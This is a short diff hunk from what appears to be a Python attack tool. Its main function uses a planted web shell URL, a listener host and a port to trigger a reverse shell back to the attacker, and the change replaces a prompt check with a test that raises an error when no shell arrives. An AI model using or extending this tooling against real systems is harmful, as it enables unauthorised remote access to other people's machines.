@@ -54,7 +54,8 @@ def main(args: Namespace):
         shell_service = ShellService(web_shell_url, lhost, lport)
         shell = shell_service.prepare_listener()
         shell_service.execute_rev_shell()
-        shell.recvline_contains(b'$', timeout=0.5) # Check shell came back
+        if (not shell_service.is_rev_shell(shell)):
+            raise Exception('No shell received!')
         p.success('Got a shell!')
     
     if(not no_pty and shell_service.is_linux()):
